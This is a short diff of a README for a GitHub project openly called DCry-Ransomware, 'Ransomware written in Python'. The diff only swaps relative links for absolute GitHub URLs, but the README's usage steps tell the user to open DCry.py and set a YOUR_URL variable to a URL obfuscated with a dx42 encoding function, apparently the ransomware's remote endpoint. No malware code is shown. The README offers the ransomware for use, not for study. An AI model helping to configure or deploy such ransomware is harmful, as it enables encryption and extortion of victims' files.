@@ -4,10 +4,10 @@
 ![License](https://img.shields.io/github/license/memecoder12345678/DCry-Ransomware?style=flat\&logo=open-source-initiative\&logoColor=white)
 ![Platform](https://img.shields.io/badge/Platform-Windows-blue)
 ![Status](https://img.shields.io/badge/Status-Temporarily--Inactive-orange)
-![DCry](./DCRY.png)
+![DCry](https://github.com/memecoder12345678/DCry-Ransomware/blob/main/DCRY.png)
 Ransomware written in Python 💀💀💀
 ## Usage
-* Open the [`DCry.py`](./src/DCry.py) file.
+* Open the [`DCry.py`](https://github.com/memecoder12345678/DCry-Ransomware/blob/main/src/DCry.py) file.
 * Replace the `YOUR_URL` variable with the encoded URL using the `dx42` function like this:
   ```python
   YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()
